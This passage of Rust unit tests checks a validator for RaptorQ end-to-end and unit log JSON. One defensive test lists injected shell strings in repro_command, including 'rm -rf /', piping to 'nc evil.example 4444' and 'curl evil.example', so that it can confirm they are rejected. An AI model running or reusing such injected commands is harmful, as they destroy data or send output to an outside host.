            "should reject non-normalized contributor weights: {violations:?}"
        );
    }

    #[test]
    fn validate_unit_log_rejects_duplicate_governance_contributor_names() {
        let mut entry = valid_unit_log_value_with_governance();
        entry["decode_stats"]["governance"]["top_evidence_contributors"][1]["name"] =
            json!("decode_success_rate");

        let violations = validate_unit_log_json(&entry.to_string());
        assert!(
            violations.iter().any(|v| {
                v.contains(
                    "decode_stats.governance.top_evidence_contributors[1].name must be distinct",
                )
            }),
            "should reject duplicate contributor names: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_missing_sections() {
        let json = r#"{"schema_version": "raptorq-e2e-log-v1", "scenario_id": "TEST"}"#;
        let violations = validate_e2e_log_json(json);
        // Should flag missing config, loss, symbols, outcome, proof
        assert!(
            violations.iter().any(|v| v.contains("config")),
            "should flag missing config"
        );
        assert!(
            violations.iter().any(|v| v.contains("proof")),
            "should flag missing proof"
        );
    }

    #[test]
    fn validate_e2e_log_invalid_profile() {
        let json = r#"{
            "schema_version": "raptorq-e2e-log-v1",
            "scenario": "test",
            "scenario_id": "RQ-E2E-TEST",
            "replay_id": "replay:test-v1",
            "profile": "invalid_profile",
            "unit_sentinel": "test::fn",
            "assertion_id": "E2E-TEST",
            "run_id": "run-1",
            "repro_command": "rch exec -- cargo test",
            "phase_markers": ["encode", "loss", "decode", "proof", "report"],
            "config": {"symbol_size": 64, "seed": 42, "block_k": 16, "data_len": 1024, "max_block_size": 1024, "repair_overhead": 1.0, "min_overhead": 0, "block_count": 1},
            "loss": {"kind": "none", "drop_count": 0, "keep_count": 16},
            "symbols": {"generated": {"total": 16, "source": 16, "repair": 0}, "received": {"total": 16, "source": 16, "repair": 0}},
            "outcome": {"success": true, "decoded_bytes": 1024},
            "proof": {"hash": 123, "summary_bytes": 100, "outcome": "success", "received_total": 16, "received_source": 16, "received_repair": 0, "peeling_solved": 16, "inactivated": 0, "pivots": 0, "row_ops": 0, "equations_used": 16}
        }"#;
        let violations = validate_e2e_log_json(json);
        assert!(
            violations.iter().any(|v| v.contains("invalid profile")),
            "should flag invalid profile: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_whitespace_only_required_fields() {
        let mut entry = valid_e2e_log_value();
        entry["scenario"] = json!("   ");
        entry["scenario_id"] = json!("\t");
        entry["replay_id"] = json!(" ");
        entry["profile"] = json!("  ");
        entry["unit_sentinel"] = json!("   ");
        entry["assertion_id"] = json!(" ");
        entry["run_id"] = json!("  ");
        entry["repro_command"] = json!("   ");

        let violations = validate_e2e_log_json(&entry.to_string());
        for field in [
            "scenario",
            "scenario_id",
            "replay_id",
            "profile",
            "unit_sentinel",
            "assertion_id",
            "run_id",
            "repro_command",
        ] {
            assert!(
                violations.iter().any(|violation| {
                    violation.contains(&format!("required field '{field}' is empty"))
                }),
                "should flag whitespace-only {field}: {violations:?}"
            );
        }
        assert!(
            !violations
                .iter()
                .any(|violation| violation.contains("must include 'rch exec --'")),
            "whitespace-only repro_command should be reported as empty, not as missing rch exec: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_whitespace_only_nested_required_strings() {
        let mut entry = valid_e2e_log_value();
        entry["loss"]["kind"] = json!("   ");
        entry["proof"]["outcome"] = json!("\t");

        let violations = validate_e2e_log_json(&entry.to_string());
        for field in ["loss.kind", "proof.outcome"] {
            assert!(
                violations
                    .iter()
                    .any(|violation| violation == &format!("{field} must be a non-empty string")),
                "should reject whitespace-only {field}: {violations:?}"
            );
        }
    }

    /// br-asupersync-zmzwof: schema validator must reject repro_command
    /// strings that contain shell metacharacters or substitutions, or that
    /// don't START with `rch exec`. Otherwise an eval-based replay tool
    /// could be hijacked into running attacker-prepended commands.
    #[test]
    fn zmzwof_validate_e2e_log_rejects_shell_meta_in_repro_command() {
        let cases: &[(&str, &str)] = &[
            ("rm -rf / ; rch exec -- cargo test", "shell metacharacter"),
            (
                "rch exec -- cargo test | nc evil.example 4444",
                "shell metacharacter",
            ),
            (
                "rch exec -- cargo test && curl evil.example",
                "shell metacharacter",
            ),
            ("rch exec -- cargo test `whoami`", "shell metacharacter"),
            ("rch exec -- cargo test\nrm -rf /", "shell metacharacter"),
            ("rch exec -- cargo test $(whoami)", "shell substitution"),
            ("rch exec -- cargo test ${HOME}/evil", "shell substitution"),
        ];
        for (cmd, expected_fragment) in cases {
            let mut entry = valid_e2e_log_value();
            entry["repro_command"] = json!(cmd);
            let violations = validate_e2e_log_json(&entry.to_string());
            assert!(
                violations.iter().any(|v| v.contains(expected_fragment)),
                "should reject shell-meta repro_command {cmd:?}: violations={violations:?}"
            );
        }
    }

    /// br-asupersync-zmzwof: repro_command must START with `rch exec`,
    /// not just contain it somewhere later in the string.
    #[test]
    fn zmzwof_validate_e2e_log_rejects_shell_prologue_before_rch_exec() {
        let mut entry = valid_e2e_log_value();
        // Prologue containing only safe-ish chars but the structure is wrong:
        // a non-rch command followed by rch — would still get rejected because
        // it doesn't start with `rch exec`.
        entry["repro_command"] = json!("env FOO=bar rch exec -- cargo test");
        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("must START with 'rch exec'")),
            "should reject prologue before rch exec: {violations:?}"
        );
    }

    /// Positive control: a valid `rch exec --` command with safe chars
    /// passes the new validator.
    #[test]
    fn zmzwof_validate_e2e_log_accepts_normal_rch_exec_command() {
        let mut entry = valid_e2e_log_value();
        entry["repro_command"] = json!("rch exec -- cargo test --lib raptorq::test_log_schema");
        let violations = validate_e2e_log_json(&entry.to_string());
        // The valid_e2e_log_value() fixture should produce no violations
        // even after our hardening; if any of our new checks are over-strict
        // they would surface here.
        assert!(
            violations.iter().all(|v| !v.contains("repro_command")),
            "valid rch exec command must not produce repro_command violations: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_out_of_order_phase_markers() {
        let mut entry = valid_e2e_log_value();
        entry["phase_markers"] = json!(["loss", "encode", "decode", "proof", "report"]);

        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("phase_markers mismatch")),
            "should reject out-of-order markers: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_duplicate_phase_markers() {
        let mut entry = valid_e2e_log_value();
        entry["phase_markers"] = json!(["encode", "loss", "decode", "decode", "report"]);

        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("phase_markers mismatch")),
            "should reject duplicate markers: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_unexpected_phase_markers() {
        let mut entry = valid_e2e_log_value();
        entry["phase_markers"] = json!(["encode", "loss", "decode", "finalize", "report"]);

        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("phase_markers mismatch")),
            "should reject unexpected marker names: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_non_string_phase_markers() {
        let mut entry = valid_e2e_log_value();
        entry["phase_markers"] = json!(["encode", "loss", "decode", 7, "report"]);

        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("phase_markers must be an array of strings")),
            "should reject non-string markers: {violations:?}"
        );
    }

    #[test]
    fn validate_e2e_log_rejects_type_invalid_nested_fields() {
        let mut entry = valid_e2e_log_value();
        entry["config"]["seed"] = json!("42");
        entry["config"]["repair_overhead"] = json!("1.0");
        entry["loss"]["kind"] = json!(7);
        entry["symbols"]["generated"]["total"] = json!("16");
        entry["outcome"]["success"] = json!("true");
        entry["proof"]["hash"] = json!("123");
        entry["proof"]["outcome"] = json!(false);

        let violations = validate_e2e_log_json(&entry.to_string());
        assert!(
            violations
                .iter()
                .any(|v| v.contains("config.seed must be an unsigned integer")),
            "should reject non-numeric config.seed: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("config.repair_overhead must be a number")),
            "should reject non-numeric config.repair_overhead: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("loss.kind must be a string")),
            "should reject non-string loss.kind: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("symbols.generated.total must be an unsigned integer")),
            "should reject non-numeric generated total: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("outcome.success must be a boolean")),
            "should reject non-boolean outcome.success: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("proof.hash must be an unsigned integer")),
            "should reject non-numeric proof.hash: {violations:?}"
        );
        assert!(
            violations
                .iter()
                .any(|v| v.contains("proof.outcome must be a string")),
            "should reject non-string proof.outcome: {violations:?}"
        );
    }

    #[test]
    fn e2e_log_entry_full_roundtrip() {
        let entry = E2eLogEntry {
            schema_version: E2E_LOG_SCHEMA_VERSION.to_string(),
            scenario: "systematic_only".to_string(),
            scenario_id: "RQ-E2E-SYSTEMATIC-ONLY".to_string(),
            replay_id: "replay:rq-e2e-systematic-only-v1".to_string(),
            profile: "fast".to_string(),
            unit_sentinel: "raptorq::tests::edge_cases::repair_zero_only_source".to_string(),
            assertion_id: "E2E-ROUNDTRIP-SYSTEMATIC".to_string(),
            run_id: "replay:rq-e2e-systematic-only-v1-seed42-k16-len1024".to_string(),
            repro_command: "rch exec -- cargo test --test raptorq_conformance e2e_pipeline_reports_are_deterministic -- --nocapture".to_string(),
            phase_markers: REQUIRED_PHASE_MARKERS.iter().map(|s| (*s).to_string()).collect(),
            config: LogConfigReport {
                symbol_size: 64,
                max_block_size: 1024,
                repair_overhead: 1.0,
                min_overhead: 0,
                seed: 42,
                block_k: 16,
                block_count: 1,
                data_len: 1024,
            },
            loss: LogLossReport {
                kind: "none".to_string(),
                seed: None,
                drop_per_mille: None,
                drop_count: 0,
                keep_count: 16,
                burst_start: None,
                burst_len: None,
            },
            symbols: LogSymbolReport {
                generated: LogSymbolCounts { total: 16, source: 16, repair: 0 },
                received: LogSymbolCounts { total: 16, source: 16, repair: 0 },
            },
            outcome: LogOutcomeReport {
                success: true,
                reject_reason: None,
                decoded_bytes: 1024,
            },
            proof: LogProofReport {
                hash: 12345,
                summary_bytes: 200,
                outcome: "success".to_string(),
                received_total: 16,
                received_source: 16,
                received_repair: 0,
                peeling_solved: 16,
                inactivated: 0,
                pivots: 0,
                row_ops: 0,
                equations_used: 16,
            },
        };

        let json = serde_json::to_string(&entry).expect("serialize");
        let violations = validate_e2e_log_json(&json);
        assert!(
            violations.is_empty(),
            "full E2E entry should pass validation: {violations:?}"
        );

        let parsed: E2eLogEntry = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(parsed.schema_version, E2E_LOG_SCHEMA_VERSION);
        assert_eq!(parsed.scenario_id, "RQ-E2E-SYSTEMATIC-ONLY");
    }

    #[test]
    fn unit_log_with_decode_stats() {
        let entry = UnitLogEntry::new(
            "RQ-U-SEED-SWEEP",
            5042,
            "k=16,symbol_size=32",
            "replay:rq-u-seed-sweep-structured-v1",
            "rch exec -- cargo test --test raptorq_perf_invariants seed_sweep_structured_logging -- --nocapture",
            "ok",
        )
        .with_decode_stats(UnitDecodeStats {
            k: 16,
            loss_pct: 25,
            dropped: 4,
            peeled: 10,
            inactivated: 2,
            gauss_ops: 8,
            pivots: 2,
            peel_queue_pushes: 12,
            peel_queue_pops: 10,
            peel_frontier_peak: 4,
            dense_core_rows: 5,
            dense_core_cols: 3,
            dense_core_dropped_rows: 1,
            fallback_reason: "peeling_exhausted_to_dense_core".to_string(),
            hard_regime_activated: true,
            hard_regime_branch: "block_schur_low_rank".to_string(),
            hard_regime_fallbacks: 1,
            conservative_fallback_reason: "block_schur_failed_to_converge".to_string(),
            governance: Some(sample_governance_decision()),
        });

        let json = entry.to_json().expect("serialize");
        let violations = validate_unit_log_json(&json);
        assert!(
            violations.is_empty(),
            "unit entry with stats should pass: {violations:?}"
        );

        let parsed: UnitLogEntry = serde_json::from_str(&json).expect("deserialize");
        let stats = parsed.decode_stats.expect("should have stats");
        assert_eq!(stats.k, 16);
        assert_eq!(stats.dropped, 4);
        assert_eq!(
            stats
                .governance
                .expect("should include governance")
                .chosen_action,
            "continue"
        );
    }

    #[test]
    fn unit_log_with_governance_snapshot_scrubbed() {
        let value = scrub_log_value_for_snapshot_test(valid_unit_log_value_with_governance());
        insta::assert_json_snapshot!("unit_log_with_governance_scrubbed", value);
    }

    #[test]
    fn structured_forensic_log_snapshot_scrubbed() {
        let mut happy = valid_e2e_log_value();
        happy["scenario"] = json!("happy_path");
        happy["scenario_id"] = json!("RQ-E2E-HAPPY-PATH");
        happy["replay_id"] = json!("replay:rq-e2e-happy-path-v1");
        happy["profile"] = json!("forensics");
        happy["unit_sentinel"] = json!("raptorq::tests::forensics::happy_path");
        happy["assertion_id"] = json!("E2E-HAPPY-PATH");
        happy["run_id"] = json!("run-happy-path-seed-20260421");
        happy["repro_command"] = json!(
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::structured_forensic_log_snapshot_scrubbed -- --nocapture"
        );
        happy["config"]["seed"] = json!(20260421u64);
        happy["config"]["block_k"] = json!(24);
        happy["config"]["data_len"] = json!(1536);
        happy["config"]["repair_overhead"] = json!(1.25);
        happy["loss"] = json!({
            "kind": "none",
            "drop_count": 0,
            "keep_count": 28
        });
        happy["symbols"] = json!({
            "generated": {"total": 28, "source": 24, "repair": 4},
            "received": {"total": 28, "source": 24, "repair": 4}
        });
        happy["outcome"] = json!({
            "success": true,
            "decoded_bytes": 1536
        });
        happy["proof"] = json!({
            "hash": 93485712014567123u64,
            "summary_bytes": 248,
            "outcome": "success",
            "received_total": 28,
            "received_source": 24,
            "received_repair": 4,
            "peeling_solved": 21,
            "inactivated": 1,
            "pivots": 2,
            "row_ops": 19,
            "equations_used": 28
        });

        let mut decode_fail = valid_e2e_log_value();
        decode_fail["scenario"] = json!("decode_fail_random_loss");
        decode_fail["scenario_id"] = json!("RQ-E2E-DECODE-FAIL");
        decode_fail["replay_id"] = json!("replay:rq-e2e-decode-fail-v1");
        decode_fail["profile"] = json!("forensics");
        decode_fail["unit_sentinel"] = json!("raptorq::tests::forensics::decode_fail_random_loss");
        decode_fail["assertion_id"] = json!("E2E-DECODE-FAIL");
        decode_fail["run_id"] = json!("run-decode-fail-seed-20260422");
        decode_fail["repro_command"] = json!(
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::structured_forensic_log_snapshot_scrubbed -- --nocapture"
        );
        decode_fail["config"]["seed"] = json!(20260422u64);
        decode_fail["config"]["block_k"] = json!(24);
        decode_fail["config"]["data_len"] = json!(1536);
        decode_fail["config"]["repair_overhead"] = json!(1.5);
        decode_fail["loss"] = json!({
            "kind": "random",
            "seed": 881122u64,
            "drop_per_mille": 375,
            "drop_count": 10,
            "keep_count": 18
        });
        decode_fail["symbols"] = json!({
            "generated": {"total": 28, "source": 24, "repair": 4},
            "received": {"total": 18, "source": 14, "repair": 4}
        });
        decode_fail["outcome"] = json!({
            "success": false,
            "reject_reason": "decode_failure_insufficient_rank",
            "decoded_bytes": 0
        });
        decode_fail["proof"] = json!({
            "hash": 445120044551200u64,
            "summary_bytes": 312,
            "outcome": "decode_failure",
            "received_total": 18,
            "received_source": 14,
            "received_repair": 4,
            "peeling_solved": 9,
            "inactivated": 4,
            "pivots": 5,
            "row_ops": 41,
            "equations_used": 18
        });

        let mut wavefront_corruption = valid_e2e_log_value();
        wavefront_corruption["scenario"] = json!("wavefront_corruption");
        wavefront_corruption["scenario_id"] = json!("RQ-E2E-WAVEFRONT-CORRUPTION");
        wavefront_corruption["replay_id"] = json!("replay:rq-e2e-wavefront-corruption-v1");
        wavefront_corruption["profile"] = json!("forensics");
        wavefront_corruption["unit_sentinel"] =
            json!("raptorq::tests::forensics::wavefront_corruption");
        wavefront_corruption["assertion_id"] = json!("E2E-WAVEFRONT-CORRUPTION");
        wavefront_corruption["run_id"] = json!("run-wavefront-corruption-seed-20260423");
        wavefront_corruption["repro_command"] = json!(
            "rch exec -- cargo test --lib raptorq::test_log_schema::tests::structured_forensic_log_snapshot_scrubbed -- --nocapture"
        );
        wavefront_corruption["config"]["seed"] = json!(20260423u64);
        wavefront_corruption["config"]["block_k"] = json!(24);
        wavefront_corruption["config"]["data_len"] = json!(1536);
        wavefront_corruption["config"]["repair_overhead"] = json!(1.75);
        wavefront_corruption["loss"] = json!({
            "kind": "burst",
            "seed": 551199u64,
            "drop_count": 6,
            "keep_count": 22,
            "burst_start": 7,
            "burst_len": 4
        });
        wavefront_corruption["symbols"] = json!({
            "generated": {"total": 28, "source": 24, "repair": 4},
            "received": {"total": 22, "source": 18, "repair": 4}
        });
        wavefront_corruption["outcome"] = json!({
            "success": false,
            "reject_reason": "wavefront_corruption_detected",
            "decoded_bytes": 640
        });
        wavefront_corruption["proof"] = json!({
            "hash": 7700553317700u64,
            "summary_bytes": 404,
            "outcome": "wavefront_corruption",
            "received_total": 22,
            "received_source": 18,
            "received_repair": 4,
            "peeling_solved": 11,
            "inactivated": 6,
            "pivots": 7,
            "row_ops": 63,
            "equations_used": 22
        });

        for (name, value) in [
            ("happy", &happy),
            ("decode_fail", &decode_fail),
            ("wavefront_corruption", &wavefront_corruption),
        ] {
            let violations = validate_e2e_log_json(&value.to_string());
            assert!(
                violations.is_empty(),
                "{name} forensic log should satisfy schema contract: {violations:?}"
            );
        }

        let value = json!([
            {
                "case": "happy",
                "report": scrub_forensic_e2e_log_value_for_snapshot_test(happy),
            },
            {
                "case": "decode_fail",
                "report": scrub_forensic_e2e_log_value_for_snapshot_test(decode_fail),
            },
            {
                "case": "wavefront_corruption",
                "report": scrub_forensic_e2e_log_value_for_snapshot_test(wavefront_corruption),
            }
        ]);

        insta::assert_json_snapshot!("structured_forensic_log_scrubbed", value);
    }

    #[test]
    fn e2e_log_entry_to_json_pretty_snapshot() {
        let entry = E2eLogEntry {
            schema_version: E2E_LOG_SCHEMA_VERSION.to_string(),
            scenario: "systematic_only".to_string(),
            scenario_id: "RQ-E2E-SYSTEMATIC-ONLY".to_string(),
            replay_id: "replay:rq-e2e-systematic-only-v1".to_string(),
            profile: "fast".to_string(),
            unit_sentinel: "test::fn".to_string(),
            assertion_id: "E2E-TEST".to_string(),
            run_id: "run-1".to_string(),
            repro_command: "rch exec -- cargo test".to_string(),
            phase_markers: vec![
                "encode".to_string(),
                "transmit".to_string(),
                "decode".to_string(),
            ],
            config: LogConfigReport {
                symbol_size: 64,
                max_block_size: 1024,
                repair_overhead: 1.0,
                min_overhead: 0,
                seed: 42,
                block_k: 16,
                block_count: 1,
                data_len: 1024,
            },
            loss: LogLossReport {
                kind: "random".to_string(),
                seed: Some(42),
                drop_per_mille: Some(100),
                drop_count: 2,
                keep_count: 18,
                burst_start: None,
                burst_len: None,
            },
            symbols: LogSymbolReport {
                generated: LogSymbolCounts {
                    total: 20,
                    source: 16,
                    repair: 4,
                },
                received: LogSymbolCounts {
                    total: 18,
                    source: 16,
                    repair: 2,
                },
            },
            outcome: LogOutcomeReport {
                success: true,
                reject_reason: None,
                decoded_bytes: 1024,
            },
            proof: LogProofReport {
                hash: 0x123456789abcdef0,
                summary_bytes: 128,
                outcome: "success".to_string(),
                received_total: 18,
                received_source: 16,
                received_repair: 2,
                peeling_solved: 16,
                inactivated: 0,
                pivots: 2,
                row_ops: 4,
                equations_used: 18,
            },
        };

        let pretty_json = entry.to_json_pretty().expect("serialize to pretty JSON");
        insta::assert_snapshot!("e2e_log_entry_pretty_json", pretty_json);
    }
